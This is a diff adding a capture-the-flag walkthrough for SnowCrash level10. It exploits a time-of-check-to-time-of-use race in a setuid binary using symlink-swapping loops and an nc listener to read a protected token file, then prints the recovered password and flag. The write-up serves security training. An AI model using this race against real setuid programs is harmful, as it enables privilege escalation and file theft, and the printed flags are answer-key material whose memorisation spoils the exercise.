@@ -1,0 +1,93 @@
+We run "ls -l" command in our home directory.
+
+level10@SnowCrash:~$ ls -l
+total 16
+-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10 flag10     26 Mar  5  2016 token
+
+We try to run the binary and see what do we get.
+
+level10@SnowCrash:~$ ./level10
+./level10 file host
+	sends file to host if you have access to it
+
+We notice that the binary needs a file and host as arguments, while the file that we need to ass should have the read and write permissions to it, so token wouldn't work but lets try it anyways.
+
+level10@SnowCrash:~$ ./level10 token 192.168.56.102
+You don't have access to token
+
+Ah expected, it would not work
+
+We test with a file we have access to:
+
+level10@SnowCrash:~$ echo "fake" > /tmp/fake
+level10@SnowCrash:~$ chmod 777 /tmp/fake
+level10@SnowCrash:~$ ./level10 /tmp/fake 127.0.0.1
+Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
+
+We see that the binary try to establish a connection with port 6969
+
+We try and listen to that port while running the binary:
+
+>On 1st terminal
+
+level10@SnowCrash:~$ nc -lv 6969
+Connection from 127.0.0.1 port 6969 [tcp/*] accepted
+.*( )*.
+fake
+
+>On 2nd terminal
+
+level10@SnowCrash:~$ ./level10 /tmp/fake 127.0.0.1
+Connecting to 127.0.0.1:6969 .. Connected!
+Sending file .. wrote file!
+
+Now lets just trace it and see what it does.
+
+level10@SnowCrash:~$ ltrace ./level10 token 192.168.56.102
+__libc_start_main(0x80486d4, 3, 0xbffff774, 0x8048970, 0x80489e0 <unfinished ...>
+access("token", 4)                                                                                                                                                                                                                = -1
+printf("You don't have access to %s\n", "token"You don't have access to token
+)                                                                                                                                                                                  = 31
++++ exited (status 31) +++
+
+We see that the binary uses the function Access() to see if the binary have the accessibility to token.
+
+And based on the man7 page, we see that there is a vulnerability in this function where we can exploit the time it takes for the function to check if the file have access.
+
+So our exploit would be to Implementing a TOCTOU race. (https://stackoverflow.com/questions/7925177/access-security-hole)
+
+The implementation would be like this:
+
+> we do a while loop that create a symlink between 2 file with all the Permissions, then instantly create a symlink between Token and one of those 2 files.
+
+While true; do ln -fs /tmp/file1 /tmp/file2; ln -fs ~/token /tmp/file2; done
+
+>Then in a 2nd terminal we run the binary with the file we linked with token in a while loop.
+
+While true; do ./level10 /tmp/file2 192.168.56.102 ; done
+
+>In a 3rd terminal we just listen to the port 6969.
+
+ While true; nc -lv 6969 ; done
+
+When we do so simultaneously, this is what we get while listening to the port:
+
+[......]
+
+Connection from 192.168.56.102 port 6969 [tcp/*] accepted
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+
+[......]
+
+We have our token now, we just log in into flag10
+
+level10@SnowCrash:~$ su flag10
+Password: woupa2yuojeeaaed06riuj63c
+Don't forget to launch getflag !
+
+We run a simple getflag:
+
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
